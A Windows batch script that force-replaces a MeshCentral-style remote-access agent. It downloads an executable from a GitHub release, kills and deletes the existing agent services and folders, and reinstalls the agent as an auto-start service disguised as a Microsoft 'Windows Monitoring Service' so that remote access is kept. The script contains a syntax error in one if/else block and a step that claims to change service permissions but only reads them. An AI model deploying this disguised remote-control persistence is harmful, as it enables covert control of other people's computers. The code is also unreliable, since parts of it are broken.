@echo off
setlocal enabledelayedexpansion

:: ============================================================================
:: Mesh Agent Force Update Script
:: Description: Safely updates Mesh Agent without losing remote access
:: ============================================================================

:: Setup paths and variables FIRST (before any logging)
set "TEMP_DIR=%TEMP%\MeshAgentUpdate_%RANDOM%"
for /f "tokens=1-3 delims=/ " %%a in ('date /t') do set "LOGDATE=%%c%%b%%a"
for /f "tokens=1-3 delims=:. " %%a in ('time /t') do set "LOGTIME=%%a%%b%%c"
set "LOG_FILE=%TEMP%\MeshAgentUpdate_%LOGDATE%_%LOGTIME%.log"
set "NEW_AGENT_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "NEW_AGENT_FILE=%TEMP_DIR%\WindowsMonitoringService64-Lol.exe"

:: Initialize log file immediately
echo ================================================ > "%LOG_FILE%"
echo Mesh Agent Force Update Script >> "%LOG_FILE%"
echo Started at %date% %time% >> "%LOG_FILE%"
echo ================================================ >> "%LOG_FILE%"
echo. >> "%LOG_FILE%"

:: Check for --yes argument
set "CONFIRMED=0"
if "%~1"=="--yes" set "CONFIRMED=1"

echo Argument received: %~1 >> "%LOG_FILE%"
echo CONFIRMED=%CONFIRMED% >> "%LOG_FILE%"
echo. >> "%LOG_FILE%"

if "%CONFIRMED%"=="0" (
    echo ERROR: This script requires --yes argument >> "%LOG_FILE%"
    echo This script will force update the Mesh Agent.
    echo Please run with --yes argument to confirm.
    exit /b 1
)

:: Known agent locations to search
set "SEARCH_PATHS[0]=Mesh Agent"
set "SEARCH_PATHS[1]=LGTW"
set "SEARCH_PATHS[2]=LGTWAgent"
set "SEARCH_PATHS[3]=Microsoft Corporation\WindowsMonitoringService"
set "SEARCH_PATHS[4]=LGTW\LGTWAgent"

:: Known agent process names
set "PROCESS_NAMES[0]=MeshAgent.exe"
set "PROCESS_NAMES[1]=MeshService.exe"
set "PROCESS_NAMES[2]=WindowsMonitoringService64.exe"
set "PROCESS_NAMES[3]=WindowsMonitoringService64-Lol.exe"
set "PROCESS_NAMES[4]=MeshAgent64.exe"
set "PROCESS_NAMES[5]=LGTW-Agent.exe"
set "PROCESS_NAMES[6]=LGTWAgent.exe"

:: Jump to main execution (skip function definitions)
goto :main

:: ============================================================================
:: Logging function
:: ============================================================================
:log
set "MSG=%~1"
echo [%time%] %MSG%
echo [%time%] %MSG% >> "%LOG_FILE%" 2>&1
goto :eof

:: ============================================================================
:: MAIN EXECUTION STARTS HERE
:: ============================================================================
:main

:: ============================================================================
:: STEP 1: Initialize
:: ============================================================================
call :log "================================================"
call :log "STEP 1: Initialization"
call :log "================================================"
call :log "Log file: %LOG_FILE%"
call :log "Temp directory: %TEMP_DIR%"
call :log "Download URL: %NEW_AGENT_URL%"
call :log "Target file: %NEW_AGENT_FILE%"

:: Check for administrator privileges
call :log "Checking administrator privileges..."
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    call :log "ERROR: This script must be run as Administrator"
    echo ERROR: This script must be run as Administrator
    echo Please right-click and select 'Run as Administrator'
    pause
    exit /b 1
)
call :log "SUCCESS: Running with administrator privileges"

:: Create temporary directory
call :log "Creating temporary directory..."
if not exist "%TEMP_DIR%" (
    mkdir "%TEMP_DIR%" 2>> "%LOG_FILE%"
    if errorlevel 1 (
        call :log "ERROR: Failed to create temporary directory"
        call :log "Error code: %errorlevel%"
        pause
        exit /b 1
    )
)
call :log "SUCCESS: Temporary directory created"

:: ============================================================================
:: STEP 2: Download new agent
:: ============================================================================
call :log "================================================"
call :log "STEP 2: Downloading new agent installer"
call :log "URL: %NEW_AGENT_URL%"
call :log "Target: %NEW_AGENT_FILE%"
call :log "================================================"

call :log "Starting download via PowerShell..."
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Write-Host 'PowerShell: Starting download...'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host 'PowerShell: Downloading from %NEW_AGENT_URL%'; Invoke-WebRequest -UseBasicParsing -Uri '%NEW_AGENT_URL%' -OutFile '%NEW_AGENT_FILE%' -ErrorAction Stop; Write-Host 'PowerShell: Download completed'; exit 0 } catch { Write-Host \"PowerShell ERROR: $($_.Exception.Message)\"; exit 1 }" >> "%LOG_FILE%" 2>&1

set "DL_ERROR=%errorlevel%"
call :log "Download command completed with code: %DL_ERROR%"

if %DL_ERROR% NEQ 0 (
    call :log "ERROR: Failed to download new agent installer (Error: %DL_ERROR%)"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    call :log "Check if URL is accessible: %NEW_AGENT_URL%"
    pause
    goto :cleanup_exit
)

:: Verify the downloaded file exists and has reasonable size
call :log "Verifying downloaded file..."
if not exist "%NEW_AGENT_FILE%" (
    call :log "ERROR: Downloaded file does not exist at %NEW_AGENT_FILE%"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    call :log "Listing temp directory contents:"
    dir "%TEMP_DIR%" >> "%LOG_FILE%" 2>&1
    pause
    goto :cleanup_exit
)

call :log "File exists, checking size..."
for %%F in ("%NEW_AGENT_FILE%") do set "FILE_SIZE=%%~zF"
call :log "File size: %FILE_SIZE% bytes"

:: Remove spaces from FILE_SIZE for comparison
set "FILE_SIZE_CLEAN=%FILE_SIZE: =%"

if %FILE_SIZE_CLEAN% LSS 100000 (
    call :log "ERROR: Downloaded file is too small (%FILE_SIZE% bytes)"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    call :log "Expected at least 100000 bytes"
    pause
    goto :cleanup_exit
)

call :log "SUCCESS: New agent downloaded and verified (%FILE_SIZE% bytes)"

:: Additional verification: Test if the file is a valid executable
call :log "Verifying file is a valid Windows executable..."
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $header = Get-Content '%NEW_AGENT_FILE%' -Encoding Byte -TotalCount 2; if ($header[0] -eq 77 -and $header[1] -eq 90) { exit 0 } else { exit 1 } } catch { exit 1 }" >> "%LOG_FILE%" 2>&1

if errorlevel 1 (
    call :log "ERROR: Downloaded file is not a valid executable"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    pause
    goto :cleanup_exit
)

call :log "SUCCESS: File verified as valid Windows executable"
call :log "Ready to proceed with agent replacement"
call :log "SAFETY: Old agent will remain running until new agent is confirmed working"

:: ============================================================================
:: STEP 3: Find existing agent installations
:: ============================================================================
call :log "================================================"
call :log "STEP 3: Locating existing agent installations"
call :log "================================================"

set "FOUND_COUNT=0"
set "INSTALL_PATHS="

:: Search in Program Files
for /L %%i in (0,1,4) do (
    if defined SEARCH_PATHS[%%i] (
        set "SEARCH_PATH=!SEARCH_PATHS[%%i]!"
        
        :: Check both Program Files locations
        if exist "%ProgramFiles%\!SEARCH_PATH!" (
            call :log "Found installation: %ProgramFiles%\!SEARCH_PATH!"
            set "INSTALL_PATHS[!FOUND_COUNT!]=%ProgramFiles%\!SEARCH_PATH!"
            set /a FOUND_COUNT+=1
        )
        
        if exist "%ProgramFiles(x86)%\!SEARCH_PATH!" (
            call :log "Found installation: %ProgramFiles(x86)%\!SEARCH_PATH!"
            set "INSTALL_PATHS[!FOUND_COUNT!]=%ProgramFiles(x86)%\!SEARCH_PATH!"
            set /a FOUND_COUNT+=1
        )
    )
)

call :log "Total installations found: %FOUND_COUNT%"

:: ============================================================================
:: STEP 4: Stop all agent processes
:: ============================================================================
call :log "================================================"
call :log "STEP 4: Stopping agent processes"
call :log "================================================"

for /L %%i in (0,1,6) do (
    if defined PROCESS_NAMES[%%i] (
        set "PROC_NAME=!PROCESS_NAMES[%%i]!"
        
        tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
        if not errorlevel 1 (
            call :log "Found running process: !PROC_NAME!"
            call :log "Attempting to stop !PROC_NAME! forcefully..."
            taskkill /F /IM "!PROC_NAME!" /T >> "%LOG_FILE%" 2>&1
            timeout /t 3 /nobreak >NUL
            
            :: Verify it's really stopped
            tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
            if not errorlevel 1 (
                call :log "WARNING: Process !PROC_NAME! still running, trying again..."
                taskkill /F /IM "!PROC_NAME!" /T >> "%LOG_FILE%" 2>&1
                timeout /t 3 /nobreak >NUL
            ) else (
                call :log "SUCCESS: Process !PROC_NAME! stopped"
            )
        )
    )
)

call :log "Process termination phase completed"

:: ============================================================================
:: STEP 5: Stop and delete agent services
:: ============================================================================
call :log "================================================"
call :log "STEP 5: Stopping and deleting agent services"
call :log "================================================"

:: Try to stop and delete common service names
for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoringService") do (
    sc query %%~S >NUL 2>&1
    if not errorlevel 1 (
        call :log "Found service: %%~S"
        
        :: Attempt 1: Try net stop
        call :log "Attempt 1/3: Stopping service %%~S with net stop..."
        net stop %%~S /y >> "%LOG_FILE%" 2>&1
        timeout /t 2 /nobreak >NUL
        
        :: Attempt 2: Try sc stop
        sc query %%~S | find "RUNNING" >NUL
        if not errorlevel 1 (
            call :log "Attempt 2/3: Stopping service %%~S with sc stop..."
            sc stop %%~S >> "%LOG_FILE%" 2>&1
            timeout /t 3 /nobreak >NUL
        )
        
        :: Attempt 3: Kill all related processes
        sc query %%~S | find "RUNNING" >NUL
        if not errorlevel 1 (
            call :log "Attempt 3/3: Force killing all service processes..."
            
            :: Kill by PID from sc queryex using both taskkill and wmic
            for /f "tokens=2 delims=:" %%P in ('sc queryex %%~S ^| find "PID"') do (
                set "SVC_PID=%%P"
                set "SVC_PID=!SVC_PID: =!"
                if not "!SVC_PID!"=="0" (
                    call :log "Killing service process tree PID: !SVC_PID! with taskkill"
                    taskkill /F /T /PID !SVC_PID! >> "%LOG_FILE%" 2>&1
                    timeout /t 2 /nobreak >NUL
                    
                    :: Try WMIC if process still exists
                    tasklist /FI "PID eq !SVC_PID!" 2>NUL | find "!SVC_PID!" >NUL
                    if not errorlevel 1 (
                        call :log "Process still alive, using WMIC to force terminate PID: !SVC_PID!"
                        wmic process where ProcessId=!SVC_PID! delete >> "%LOG_FILE%" 2>&1
                    )
                )
            )
            
            :: Also kill by known process names
            for /L %%i in (0,1,6) do (
                if defined PROCESS_NAMES[%%i] (
                    set "PROC_NAME=!PROCESS_NAMES[%%i]!"
                    tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
                    if not errorlevel 1 (
                        call :log "Force killing process: !PROC_NAME! with taskkill"
                        taskkill /F /IM "!PROC_NAME!" /T >> "%LOG_FILE%" 2>&1
                        timeout /t 1 /nobreak >NUL
                        
                        :: Verify and use WMIC if still alive
                        tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
                        if not errorlevel 1 (
                            call :log "Process !PROC_NAME! still alive, using WMIC"
                            wmic process where "name='!PROC_NAME!'" delete >> "%LOG_FILE%" 2>&1
                        )
                    )
                )
            )
            
            timeout /t 5 /nobreak >NUL
        )
        
        :: Final verification
        sc query %%~S | find "STOPPED" >NUL
        if not errorlevel 1 (
            call :log "SUCCESS: Service %%~S is now stopped"
        ) else (
            sc query %%~S | find "RUNNING" >NUL
            if not errorlevel 1 (
                call :log "ERROR: Service %%~S is still running after all attempts"
            ) else (
                call :log "INFO: Service %%~S is in transition state"
            )
        )
        
        :: Wait before deletion
        call :log "Waiting 3 seconds before service deletion..."
        timeout /t 3 /nobreak >NUL
        
        :: Disable service first
        call :log "Disabling service %%~S..."
        sc config %%~S start= disabled >> "%LOG_FILE%" 2>&1
        
        :: Try to grant permissions using sc sdset (allow delete)
        call :log "Modifying service security descriptor..."
        sc sdshow %%~S > "%TEMP%\svc_sd.txt" 2>&1
        
        :: Delete the service
        call :log "Deleting service %%~S..."
        sc delete %%~S >> "%LOG_FILE%" 2>&1
        set "DEL_ERROR=!errorlevel!"
        
        if !DEL_ERROR! EQU 0 (
            call :log "SUCCESS: Service %%~S marked for deletion"
        ) else if !DEL_ERROR! EQU 1072 (
            call :log "INFO: Service %%~S marked for deletion on reboot (Error: 1072)"
        ) else (
            call :log "WARNING: Failed to delete service %%~S (Error: !DEL_ERROR!)"
            call :log "Attempting alternative deletion with sc delete /force..."
            
            :: Some systems support /force flag
            sc delete %%~S /force >> "%LOG_FILE%" 2>&1
            if !errorlevel! EQU 0 (
                call :log "SUCCESS: Service deleted with /force flag"
            ) else (
                call :log "Service will be removed on next reboot or by installer"
            )
        )
    )
)

call :log "Waiting 10 seconds for services to fully terminate..."
timeout /t 10 /nobreak >NUL

:: ============================================================================
:: STEP 6: Uninstall old agents
:: ============================================================================
call :log "================================================"
call :log "STEP 6: Uninstalling old agents"
call :log "================================================"

if %FOUND_COUNT% GTR 0 (
    set /a "MAX_INDEX=%FOUND_COUNT%-1"
    call :log "Processing %FOUND_COUNT% installation(s)..."
    
    for /L %%i in (0,1,!MAX_INDEX!) do (
        if defined INSTALL_PATHS[%%i] (
            set "INST_PATH=!INSTALL_PATHS[%%i]!"
            call :log "Processing installation at: !INST_PATH!"
            
            :: Look for and run uninstaller (try most common first)
            if exist "!INST_PATH!\WindowsMonitoringService64.exe" (
                call :log "Running uninstaller: !INST_PATH!\WindowsMonitoringService64.exe -uninstall"
                "!INST_PATH!\WindowsMonitoringService64.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
            
            if exist "!INST_PATH!\LGTW-Agent.exe" (
                call :log "Running uninstaller: !INST_PATH!\LGTW-Agent.exe -uninstall"
                "!INST_PATH!\LGTW-Agent.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
            
            if exist "!INST_PATH!\LGTWAgent.exe" (
                call :log "Running uninstaller: !INST_PATH!\LGTWAgent.exe -uninstall"
                "!INST_PATH!\LGTWAgent.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
            
            if exist "!INST_PATH!\MeshAgent.exe" (
                call :log "Running uninstaller: !INST_PATH!\MeshAgent.exe -uninstall"
                "!INST_PATH!\MeshAgent.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
            
            if exist "!INST_PATH!\MeshService.exe" (
                call :log "Running uninstaller: !INST_PATH!\MeshService.exe -uninstall"
                "!INST_PATH!\MeshService.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
        )
    )
) else (
    call :log "No existing installations to uninstall"
)

call :log "Waiting 5 seconds for uninstallers to complete..."
timeout /t 5 /nobreak >NUL

:: ============================================================================
:: STEP 7: Delete old installation directories
:: ============================================================================
call :log "================================================"
call :log "STEP 7: Deleting old installation directories"
call :log "================================================"

if %FOUND_COUNT% GTR 0 (
    set /a "MAX_INDEX=%FOUND_COUNT%-1"
    
    for /L %%i in (0,1,!MAX_INDEX!) do (
        if defined INSTALL_PATHS[%%i] (
            set "INST_PATH=!INSTALL_PATHS[%%i]!"
            
            if exist "!INST_PATH!" (
                call :log "Deleting directory: !INST_PATH!"
                
                :: First attempt - normal delete
                rd /s /q "!INST_PATH!" >> "%LOG_FILE%" 2>&1
                timeout /t 2 /nobreak >NUL
                
                :: Verify deletion
                if exist "!INST_PATH!" (
                    call :log "First attempt failed, taking ownership..."
                    
                    :: Take ownership and grant permissions
                    takeown /F "!INST_PATH!" /R /D Y >> "%LOG_FILE%" 2>&1
                    icacls "!INST_PATH!" /grant administrators:F /T >> "%LOG_FILE%" 2>&1
                    
                    :: Try deleting again
                    rd /s /q "!INST_PATH!" >> "%LOG_FILE%" 2>&1
                    timeout /t 2 /nobreak >NUL
                    
                    if exist "!INST_PATH!" (
                        call :log "WARNING: Failed to delete !INST_PATH!"
                        call :log "Files may be locked, will continue anyway"
                    ) else (
                        call :log "SUCCESS: Deleted !INST_PATH! after taking ownership"
                    )
                ) else (
                    call :log "SUCCESS: Directory !INST_PATH! deleted"
                )
            )
        )
    )
) else (
    call :log "No directories to delete"
)

:: ============================================================================
:: STEP 8: Install new agent
:: ============================================================================
call :log "================================================"
call :log "STEP 8: Installing new agent"
call :log "================================================"

:: Try multiple installation methods
set "INSTALL_SUCCESS=0"

:: Method 1: Try with --fullinstall flag
call :log "Method 1: Trying installation with --fullinstall flag..."
call :log "Executing: %NEW_AGENT_FILE% --fullinstall"
start /wait "" "%NEW_AGENT_FILE%" --fullinstall >> "%LOG_FILE%" 2>&1
set "INSTALL_ERROR=%errorlevel%"
call :log "Exit code: %INSTALL_ERROR%"

:: Wait and check if service was created
timeout /t 5 /nobreak >NUL
sc query WindowsMonitoringService >NUL 2>&1
if not errorlevel 1 (
    call :log "SUCCESS: Service created with --fullinstall flag"
    set "INSTALL_SUCCESS=1"
) else (
    call :log "Service not found, trying alternative installation methods..."
    
    :: Method 2: Try without arguments
    call :log "Method 2: Trying installation without arguments..."
    call :log "Executing: %NEW_AGENT_FILE%"
    start /wait "" "%NEW_AGENT_FILE%" >> "%LOG_FILE%" 2>&1
    timeout /t 5 /nobreak >NUL
    
    sc query WindowsMonitoringService >NUL 2>&1
    if not errorlevel 1 (
        call :log "SUCCESS: Service created without arguments"
        set "INSTALL_SUCCESS=1"
    ) else (
        :: Method 3: Try with -install flag
        call :log "Method 3: Trying installation with -install flag..."
        call :log "Executing: %NEW_AGENT_FILE% -install"
        start /wait "" "%NEW_AGENT_FILE%" -install >> "%LOG_FILE%" 2>&1
        timeout /t 5 /nobreak >NUL
        
        sc query WindowsMonitoringService >NUL 2>&1
        if not errorlevel 1 (
            call :log "SUCCESS: Service created with -install flag"
            set "INSTALL_SUCCESS=1"
        ) else (
            :: Method 4: Try with /install flag
            call :log "Method 4: Trying installation with /install flag..."
            call :log "Executing: %NEW_AGENT_FILE% /install"
            start /wait "" "%NEW_AGENT_FILE%" /install >> "%LOG_FILE%" 2>&1
            timeout /t 5 /nobreak >NUL
            
            sc query WindowsMonitoringService >NUL 2>&1
            if not errorlevel 1 (
                call :log "SUCCESS: Service created with /install flag"
                set "INSTALL_SUCCESS=1"
            )
        )
    )
)

if "%INSTALL_SUCCESS%"=="0" (
    call :log "ERROR: Failed to install service with all methods"
    call :log "Checking if executable was copied to target location..."
    
    :: Check common installation paths
    if exist "%ProgramFiles%\Microsoft Corporation\WindowsMonitoringService\WindowsMonitoringService64.exe" (
        call :log "Found executable in Program Files, attempting manual service creation..."
        set "SERVICE_EXE=%ProgramFiles%\Microsoft Corporation\WindowsMonitoringService\WindowsMonitoringService64.exe"
        
        :: Create service manually
        sc create WindowsMonitoringService binPath= "!SERVICE_EXE!" start= auto DisplayName= "Windows Monitoring Service" >> "%LOG_FILE%" 2>&1
        if not errorlevel 1 (
            call :log "SUCCESS: Service created manually"
            set "INSTALL_SUCCESS=1"
        )
    )
)

if "%INSTALL_SUCCESS%"=="1" (
    call :log "Installation phase completed successfully"
else (
    call :log "WARNING: Installation verification failed"
)

:: Wait for installation to complete and services to start
call :log "Waiting 10 seconds for service to initialize..."
timeout /t 10 /nobreak >NUL

:: Check if service exists and configure it
sc query WindowsMonitoringService >NUL 2>&1
if not errorlevel 1 (
    call :log "Service WindowsMonitoringService found"
    call :log "Configuring service to start automatically..."
    sc config WindowsMonitoringService start= auto >> "%LOG_FILE%" 2>&1
    
    :: Check current service state
    sc query WindowsMonitoringService | find "RUNNING" >NUL
    if errorlevel 1 (
        call :log "Service not running, attempting to start..."
        sc start WindowsMonitoringService >> "%LOG_FILE%" 2>&1
        
        :: Wait for service to start
        timeout /t 10 /nobreak >NUL
        
        :: Verify service started
        sc query WindowsMonitoringService | find "RUNNING" >NUL
        if not errorlevel 1 (
            call :log "SUCCESS: Service started successfully"
        ) else (
            call :log "WARNING: Service failed to start, checking status..."
            sc query WindowsMonitoringService >> "%LOG_FILE%" 2>&1
            
            :: Try starting again
            call :log "Retrying service start..."
            net start WindowsMonitoringService >> "%LOG_FILE%" 2>&1
            timeout /t 5 /nobreak >NUL
        )
    ) else (
        call :log "Service is already running"
    )
) else (
    call :log "WARNING: Service WindowsMonitoringService not found"
    call :log "Installation may have failed or service has different name"
    
    :: List all services containing "mesh" or "monitoring"
    call :log "Searching for related services..."
    sc query type= service state= all | find /I "monitoring" >> "%LOG_FILE%" 2>&1
    sc query type= service state= all | find /I "mesh" >> "%LOG_FILE%" 2>&1
)

:: ============================================================================
:: STEP 9: Verify new installation
:: ============================================================================
call :log "================================================"
call :log "STEP 9: Verifying new installation"
call :log "================================================"

set "NEW_INSTALL_VERIFIED=0"
set "RETRY_COUNT=0"

:verify_installation
set /a "RETRY_COUNT+=1"
call :log "Verification attempt %RETRY_COUNT%/3..."

:: Check if new service is running
for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoringService") do (
    sc query %%~S 2>NUL | find "RUNNING" >NUL
    if not errorlevel 1 (
        call :log "SUCCESS: Service %%~S is running"
        set "NEW_INSTALL_VERIFIED=1"
    )
)

:: Check if new process is running
for /L %%i in (0,1,6) do (
    if defined PROCESS_NAMES[%%i] (
        set "PROC_NAME=!PROCESS_NAMES[%%i]!"
        tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
        if not errorlevel 1 (
            call :log "SUCCESS: Process !PROC_NAME! is running"
            set "NEW_INSTALL_VERIFIED=1"
        )
    )
)

if "%NEW_INSTALL_VERIFIED%"=="0" (
    if %RETRY_COUNT% LSS 3 (
        call :log "WARNING: Agent not running, attempting recovery (attempt %RETRY_COUNT%/3)..."
        
        :: Try to start any existing service
        for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "LGTW-Agent" "WindowsMonitoringService") do (
            sc query %%~S >NUL 2>&1
            if not errorlevel 1 (
                call :log "Found stopped service %%~S, attempting to start..."
                sc start %%~S >> "%LOG_FILE%" 2>&1
                net start %%~S >> "%LOG_FILE%" 2>&1
            )
        )
        
        :: Wait and retry verification
        timeout /t 10 /nobreak >NUL
        goto :verify_installation
    ) else (
        call :log "CRITICAL ERROR: Failed to verify agent after 3 attempts"
        call :log "Attempting emergency reinstallation..."
        
        :: Emergency reinstall
        if exist "%NEW_AGENT_FILE%" (
            call :log "Emergency: Running installer again..."
            start /wait "" "%NEW_AGENT_FILE%" --fullinstall >> "%LOG_FILE%" 2>&1
            timeout /t 10 /nobreak >NUL
            
            :: Check one more time
            for %%S in ("WindowsMonitoringService") do (
                sc query %%~S 2>NUL | find "RUNNING" >NUL
                if not errorlevel 1 (
                    call :log "RECOVERY SUCCESS: Service started after emergency reinstall"
                    set "NEW_INSTALL_VERIFIED=1"
                )
            )
        )
        
        if "%NEW_INSTALL_VERIFIED%"=="0" (
            call :log "CRITICAL: Emergency reinstallation failed"
            call :log "Manual intervention required"
            call :log "Installer location: %NEW_AGENT_FILE%"
            echo.
            echo ================================================
            echo CRITICAL ERROR: Agent installation failed
            echo Manual intervention required
            echo Installer: %NEW_AGENT_FILE%
            echo Log: %LOG_FILE%
            echo ================================================
            pause
        )
    )
) else (
    call :log "SUCCESS: New agent installation verified and running"
)

:: ============================================================================
:: STEP 10: Cleanup
:: ============================================================================
call :log "================================================"
call :log "STEP 10: Cleanup"
call :log "================================================"

:: Delete temporary installer
if exist "%NEW_AGENT_FILE%" (
    call :log "Deleting temporary installer: %NEW_AGENT_FILE%"
    del /f /q "%NEW_AGENT_FILE%" >> "%LOG_FILE%" 2>&1
)

:: Delete temporary directory
if exist "%TEMP_DIR%" (
    call :log "Deleting temporary directory: %TEMP_DIR%"
    rd /s /q "%TEMP_DIR%" >> "%LOG_FILE%" 2>&1
)

call :log "================================================"
call :log "Mesh Agent Force Update Completed"
call :log "================================================"
call :log "Log file saved at: %LOG_FILE%"
call :log "Script finished at %date% %time%"
call :log "Installation status: %NEW_INSTALL_VERIFIED%"
call :log "================================================"

echo.
echo ================================================
if "%NEW_INSTALL_VERIFIED%"=="1" (
    echo SUCCESS: Update completed successfully!
    echo Agent is running and connected
    echo Service WindowsMonitoringService is operational
) else (
    echo WARNING: Update completed with issues
    echo Agent may not be running - check log file
    echo Manual verification recommended
)
echo.
echo Log file: %LOG_FILE%
echo ================================================
echo.

endlocal
exit /b 0

:: ============================================================================
:: Cleanup and exit with error
:: ============================================================================
:cleanup_exit

:: Delete temporary installer if exists
if exist "%NEW_AGENT_FILE%" (
    call :log "Cleaning up temporary installer..."
    del /f /q "%NEW_AGENT_FILE%" >> "%LOG_FILE%" 2>&1
)

:: Delete temporary directory if exists
if exist "%TEMP_DIR%" (
    call :log "Cleaning up temporary directory..."
    rd /s /q "%TEMP_DIR%" >> "%LOG_FILE%" 2>&1
)

call :log "================================================"
call :log "Script aborted with errors"
call :log "Log file: %LOG_FILE%"
call :log "================================================"

echo.
echo ================================================
echo ERROR: Update failed - see log for details
echo Log file: %LOG_FILE%
echo ================================================
echo.

endlocal
exit /b 1
